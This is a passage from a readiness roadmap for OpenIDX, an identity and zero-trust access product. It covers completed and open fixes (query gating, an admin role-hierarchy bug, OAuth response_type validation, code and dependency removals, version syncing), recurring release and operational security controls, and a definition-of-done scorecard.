   nothing on screen disagreed. All three now await the sync and, on
   failure, say which of the two happened.

   **The topology drew a picture out of one gated query and four ungated
   ones.** `network-topology.tsx` assembles ONE diagram from identities,
   services, routers, policies and (optionally) sessions; only identities was
   wrapped in `QueryGate`, so a 403 on services or a controller that had
   stopped answering fell through `?? []` and rendered a clean, believable,
   mostly-empty overlay. On a zero-trust network "nothing is published" and
   "we could not ask" are opposite conclusions. A new `QueryGateAll` fails
   the whole view if any input failed, and all five go through it.

   **The guard that should have caught that was file-granular.**
   `check-query-error-coverage.sh` asked only whether `QueryGate` appeared
   *anywhere* in a file, which network-topology satisfied with five queries
   and one gate. It now also requires every `const fooQuery = useQuery(...)`
   to appear inside a `query=`/`queries=` prop. Stated rather than implied:
   this sees only queries bound to a named const — the shape a page uses when
   it means to gate one — and `const { data } = useQuery(...)` stays covered
   by the file rule alone. Four pages are on a pinned, shrink-only register
   with a reason each (`ops-cockpit` has eleven independent subsystem cards,
   where an all-or-nothing gate would blank the cockpit because one subsystem
   is down — it needs a gate per card). The register can only shrink: an
   entry that is fully gated, or whose page is gone, fails as a stale entry.
   Nine self-test cases, including the one that made the rule necessary.

   **`AdminRoute` locked out the most privileged role in the product.** It
   asked `hasRole('admin')`, and `lib/auth.tsx` implements that as
   `roles.includes(role)` — a literal membership test, not a hierarchy one.
   The backend issues tokens carrying `["super_admin"]` and nothing else
   (`internal/auth/context_test.go` pins it), which does not contain the
   string `"admin"`, so super-admins were redirected away from Vault Secrets,
   the PAM dashboard and Rotation Policies. It now uses `hasMinRole`, the
   same hierarchy the backend uses. `App.admin-route.test.tsx` renders the
   guard across the whole role matrix — super_admin and admin in; operator,
   auditor, user, compliance_reader, an unknown role and an empty token out —
   and is red against the predicate it replaced.
3. ☐ **Dead console code out** (~1,300 LOC incl. `mfa-setup-wizard.tsx`),
   duplicate proxy-route toggles collapsed, tests for the untested
   security pages (`add-device`, `remote-support-popout`, `lib/webauthn`,
   `api/mfa`), the `tr` catalog lazy-loaded.
4. ◐ **Backend hygiene.** The deletions and the second unenforced validator
   are done; the security-core tests and the OpenAPI sweep are not.

   **`/authorize` now validates `response_type`** — the twin of the scope gap
   P6.8 closed, and the same shape: `/authorize/v2` has checked it since it
   was written (`AuthorizeHandler.validateResponseType`), and the primary
   handler, the one every browser client actually reaches, checked nothing.
   A client registered for `["code"]` could ask for a token in the fragment
   and be carried to a login screen before anything noticed. Both handlers now
   share one `responseTypeAllowedForClient`, so they cannot drift into two
   opinions again — a test asserts they agree.

   Adding the check surfaced a way to turn it into an outage.
   `oauth_clients.response_types` is JSONB with **no column default**, so a row
   written by anything that does not set it reads back empty, and refusing
   those would have locked that client out entirely. RFC 7591 §2 makes the
   default `["code"]` and `dcr.go` already applies exactly that at
   registration; the predicate now applies it at the enforcement point too.
   (The console's Applications page sends `["code"]` explicitly and every
   seeded client carries it, so this is for rows that predate or bypass those
   paths — including, before this, any that `/authorize/v2` would already have
   refused.)

   **Deleted:** `internal/feature/` (780 lines, 13 routes, no importer, with a
   `TODO` that silently substituted a memory store); `internal/oauth/store.go`
   (539 lines of a second, parallel token store with no non-test caller, whose
   knowingly-broken token-family revocation would have been a P0 the day
   someone wired it). `AccessTokenData` was the one symbol in it the live code
   used and moved to `oauth_types.go`; the tests that exercised the store went
   with it, and `TestConcurrentTokenGeneration` was repointed at
   `generateRandomToken` — it had been asserting uniqueness about the wrong
   generator. `codeRef` and its test went too: the live authorize/token path
   never logs a raw code, so the helper protected nothing.

   **The gateway required a logger and threw every line away.**
   `logInfo`/`logError` were empty bodies under a "would use proper logger"
   comment, while `NewService` refuses to start without `cfg.Logger`. The
   gateway's shutdown sequence and every per-request line went nowhere — on
   the one process whose logs say whether a request was proxied, to where, and
   how long it took. They log now.

   Still open, and moved to their own entry rather than left implied: tests
   that name the security core (`handleToken`, refresh, revoke, the MFA
   step-up handlers, backup/bypass codes, vault reveal/checkout,
   `RunSoDSweep`, `handleApproveRequest`, kill switch, the Guac session
   handlers), and the OpenAPI sweep (routed-but-undocumented groups, the three
   specs with no service, the ten `version: 0.1.0` fields).
5. ◐ **Mobile (D1)** — the deletion half is done, brought forward from P7
   because the newly blocking Trivy scan found six HIGH advisories
   (brace-expansion ×2, browserslist ×2, js-yaml, nanoid) in
   `mobile/package-lock.json`. Waiving findings in a tree a ratified decision
   already deletes would have been the wrong answer, so the tree went instead:
   `mobile/` (102 files), `.github/workflows/mobile-eas-build.yml`, and
   `docs/mobile-developer-guide-simple.md` (a setup guide for an app that no
   longer exists) are gone, with the `.gitignore` entries and the `docs/README`
   index updated. The three mobile documents that carry **API contracts** are
   kept and now open with a banner saying the Expo app is deleted, the client
   is Flutter, and their `mobile/src/...` pointers are historical.
   The **push half is now done**: `firebase_core` / `firebase_messaging`,
   `lib/firebase_options.dart` (which carried a live Firebase project id) and
   `lib/mobile/firebase_push.dart` are deleted, and the client's only transport
   is the self-hosted ntfy topic — a `ntfy:<stable-id>` device token the server
   now recognises and skips the provider hop for, instead of failing an FCM
   send on every challenge. It was also load-bearing for CI: the Firebase C++
   SDK's `cmake_minimum_required(VERSION 3.1)` is rejected by CMake 4, so the
   Windows desktop build could not configure at all while it was a dependency.
   `docs/mobile/firebase-fcm-setup.md` ("how to turn Firebase on") became
   `docs/mobile/push-mfa-delivery.md` (what ships, and what re-adding a
   provider would cost).
   Still to do, with the Flutter work: release keystore from CI secrets,
   backup-codes / passkeys / TOTP screens ported, iOS built as an artifact
   until Apple credentials exist, and those three documents retargeted at
   `client/` file paths rather than merely bannered.

### P8 — Docs and the release

1. ☐ **Docs sweep 3** — the drift the 2026-09-01 sweep missed
   (`IMPLEMENTATION_GUIDE.md`, `IMPLEMENTATION_PLAN_PARALLEL.md`,
   `FRONTEND_NAVIGATION.md`, `DEV-BRANCH-SUMMARY.md`, `CONTRIBUTING.md`,
   the second `Admin123!` in `USER_GUIDE.md`, the README's saving claim
   the landing test forbids, the mkdocs phantom Discord/analytics ids), an
   IGA guide page so all four pillars are on the site, roadmap epics
   documented as API-only (D3), and a docs-drift guard with a self-test
   so none of it comes back.
2. ☐ **CHANGELOG** advanced through v1.28.0…v1.33.3 by tag date, this
   branch under `[Unreleased]`, compare links repaired.
3. ✅ **One version, and something that keeps it.** The tree carried five
   answers to "what version is this?" and none of them was wrong on purpose:
   the console said 1.27.0, the Helm chart's `appVersion` said 0.1.0, the
   Flutter client said 1.33.2, all ten OpenAPI specs said 0.1.0, and the last
   actual release was v1.33.3. Each moved on its own because nothing compared
   them — and this is a product whose users are told to verify signatures
   against a release number.

   `VERSION` at the repo root is now the single answer (1.34.0), and
   `scripts/check-version-sync.sh` holds the console, the chart's
   `appVersion`, the Flutter client's semver and all ten specs to it. It runs
   in the `GitHub config is runnable` job with its self-test, whose eight
   cases include each way the tree actually drifted. Two things are
   deliberately *not* compared, and the self-test pins that too: the chart's
   own `version:`, which by Helm convention moves when the templates change
   rather than when the app does, and the Flutter build number after the `+`.

   `PRODUCTION-READINESS.md` had said "Released version: v1.0.0" for eight
   releases; it now names v1.33.3 as the last release and points at `VERSION`
   for what is being built.

   **Correction to the audit.** It listed
   `notifications-service.yaml`, `organization-service.yaml` and
   `portal-service.yaml` as specs for services that do not exist, on the
   evidence that no `cmd/` directory matches. Every path in all three is
   registered by a running process: `internal/organization` is mounted by
   governance-service, oauth-service and access-service; `internal/portal` and
   `internal/notifications` by identity-service (and notifications by
   admin-api too). "No `cmd/`" means "not its own binary", not "not served".
   Each spec now says which processes serve it, so the next reader does not
   have to re-derive it.
4. ☐ **`docs/evidence/`** — for each §5 control, the CI artifact that
   proves it or the operator command and where to file the result.

*Exit test:* `mkdocs build --strict` on PRs; the version-sync and
docs-drift guards green; then the maintainer tags v1.34.0.

---

## 5. The controls — recurring checks that keep the project ready

These are *controls* in the audit sense: run them on a cadence, keep the
evidence. §5.1 gates every release; §5.2 verifies a running install; §5.3
is the invariant that prevents the four-systems problem from returning.

### 5.1 Release-gate controls (every release)

- [ ] `make build` + full test suite green, including `test-integration`
      (Required Checks already enforce this — keep it that way).
- [ ] `tools/orgscope` clean (tenant boundary) — merge-blocking, do not
      waiver.
- [ ] Security scans **gating** (post-P0.5): CodeQL, govulncheck, Trivy,
      Gitleaks, Semgrep — zero unwaivered criticals.
- [ ] Migration drill: `cmd/migrate up` from the previous release's schema,
      then `down` one step, on a copy.
- [ ] `ValidateProduction()` smoke: a deliberately-insecure config refuses
      to start (this is the security floor — prove the gate still bites).
- [ ] `make dr-game-day` (or at minimum `cmd/backup` restore-verify) —
      a false-green DR drill is worse than none.
- [ ] `tools/darkprobe`: dark services reachable by an authorized identity
      and **not** by an unauthorized one.
- [ ] Assignment report clean (post-P1): no would-deny entries you didn't
      intend; `display == enforcement` spot-check per §5.3.
- [ ] CHANGELOG updated, version tagged, artifacts signed (post-P3),
      README/status docs match the release ("docs currency" — grep the
      release notes for anything that invalidates an entry-point doc).

### 5.2 Operational controls (running install — monthly, and after incidents)

Identity & session:

- [ ] Default admin rotated; ≥2 admin accounts; MFA enrolled on all admins
      (TOTP + hardware backup).
- [ ] Revoke a test session from the admin console → refresh token dies
      (validates A1 stays fixed); kill-switch drill on a test user → IAM,
      PAM, Ziti all report severed.
- [ ] MFA factors that are *offered* are *deliverable*: send a real SMS and
      email OTP (a typo'd provider silently mocks — A-class defect);
      confirm push approval end to end.
- [ ] JWT signing key age ≤ 90 days (nothing in code reminds you).

Access model (the §1 spine):

- [ ] Pick 3 users; compare My Apps & Network ↔ Access 360 ↔ assignment
      report ↔ actual dial/launch. All four agree.
- [ ] Access review revoke on a test grant propagates (portal, proxy,
      overlay) within the sweep interval.

Platform (see [SECURITY-HARDENING.md](./SECURITY-HARDENING.md) for the
full config-gate list — it is the enforced source of truth):

- [ ] All services green on `/health` + `/ready`; Prometheus scraping all
      8; alert routes paged to a human.
- [ ] Audit pipeline: a test admin action appears in `unified_audit_events`
      and in the SIEM forwarder; hash-chain verification passes.
- [ ] Backup CronJob/timer ran in the last 24 h **and** the latest
      restore-verify passed.
- [ ] No `latest` image tags in production; image digests pinned.
- [ ] Grafana/observability endpoints are not exposed with default creds.

### 5.3 The display==enforcement invariant (verify whenever access machinery changes)

For each grant type, the place a person *sees* it and the place the system
*enforces* it must use the same predicate:

| Grant | Displayed at | Enforced at | Verify by |
|---|---|---|---|
| App assignment | My Apps & Network, Access 360 | `internal/appaccess` via proxy, `/oauth/authorize`, Ziti dial policy (post-P1) | assignment report empty; dial test |
| Role/group | Users/Groups pages | JWT `roles` claim, route checks | route probe as member vs non-member |
| Vault/PAM grant | My Privileged Access, PAM pages | `pamEntryAllowed` at connect/reveal | connect as granted vs ungranted user |
| Session | Sessions pages | Redis `revoked_session:*` at refresh/userinfo | revoke → refresh fails |
| MFA policy | MFA Management | `IsMFARequired` in the OAuth login path | policy user is challenged; exempt user isn't |
| Device trust | My Devices, Access 360 | Ziti posture + `#device-trusted` attribute | untrusted device denied dial |

Anything that appears in an admin UI without a row in this table is a
defect: either wire it or remove it.

### 5.4 Zero-trust tenets (NIST SP 800-207) — where OpenIDX stands

| Tenet | Mechanism | Status |
|---|---|---|
| All resources dark; access per-session | Ziti overlay, no inbound ports, per-session circuits | ✅ (per-app scoping post-P1) |
| Dynamic policy: identity + device + context | Posture checks, risk engine, step-up, MFA policy | ⚠️ A2 closed on this branch (threat list feeds the login score); MFA policy live post-rollout |
| Monitor & measure integrity | Posture, EDR integration, audit hash-chain | ✅ |
| Authenticate/authorize strictly before access | OIDC/SAML + MFA + fail-closed RLS/OPA | ✅ (revocation latency caveat, A1/TTL) |
| Least privilege per request | Assignment-as-grant, JIT, SoD, vault checkout | ⚠️ becomes true when `ACCESS_ASSIGNMENT_ENFORCE=true` |
| Collect & improve | Unified audit, SIEM, risk analytics, self-heal | ✅ |

---

## 6. Definition of Done — "fully functional, well defined, end to end"

Call the project ready from the user's perspective when all of these hold:

1. Every journey J1–J8 in §3 is ✅ with no manual workaround, and each has
   an automated or scripted verification.
2. `ACCESS_ASSIGNMENT_ENFORCE=true` in the reference deployment (operator
   step); the server-rendered login is deleted from the code — ✅ done in
   P6.1, one login UI at `OAUTH_LOGIN_URL`, guarded by a route-table test
   and an enforced-posture integration case; §5.3's table holds for every
   row.
3. Every control visible in the admin console enforces something (no
   A-class defects open).
4. A new operator completes first run from the README alone; a new end
   user completes login→MFA→launch from the published docs alone; an
   evaluator can find all four pillars on the docs site.
5. `SECURITY.md`, the README, and the docs site tell one story, and a
   threat model + control mapping exist for the auditor.
6. Releases are current (no >2-week unreleased security fixes), signed,
   and the Helm path installs working or is not advertised.
7. The §5 controls have run at least once on cadence with evidence.

### 6.1 Scorecard (2026-09-04)

| DoD item | State | What proves it, or what is missing |
|---|---|---|
| 1 · journeys verified | ☐ | J1 needs the smoke job (P6.2); J3 the enforced-posture integration case (P6.1); J7 a leaver integration case; J4/J5/J8 keep scripted operator drills (`tools/darkprobe`, `make dr-game-day`) filed under `docs/evidence/` (P8.4) |
| 2 · enforced posture, legacy login gone | ☐ | code: P6.1 (Task 15 is unremoved code today, `internal/oauth/service.go` registers the routes unconditionally); ops: rollout Task 16 |
| 3 · every control enforces | ☐ | P5 (the eleven items above); the tenant boundary itself is P5.1–5.3 + the P5.3b register programme |
| 4 · first run / first login / four pillars from the docs | ☐ | smoke job (P6.2), `USER_GUIDE.md` credential (P8.1), IGA guide page (P8.1) |
| 5 · one story + auditor artifacts | ☐ | threat model and control mapping exist; docs sweep 3 + drift guard (P8.1) |
| 6 · releases current, signed, Helm proven | ☐ | CHANGELOG/pins (P8.2–3); v1.34.0 will be the first signed tag; `kind` install proof (P6.4) |
| 7 · controls run with evidence | ☐ | §5.1 automated half in CI; §5.2/§5.3 operator-run; `docs/evidence/` (P8.4) |

---

## 7. When this file is wrong

This document follows the repo's convention: it cites the file that settles
each claim, so it can be re-verified. If you fix something listed here,
update or strike the entry in the same PR — a gap list that is not
re-checked becomes a rumour (see the §6 preamble of
[PRODUCTION-READINESS.md](./PRODUCTION-READINESS.md), which learned this
the hard way). If this document and the code disagree, the code is right
and this file has rotted: fix the file.
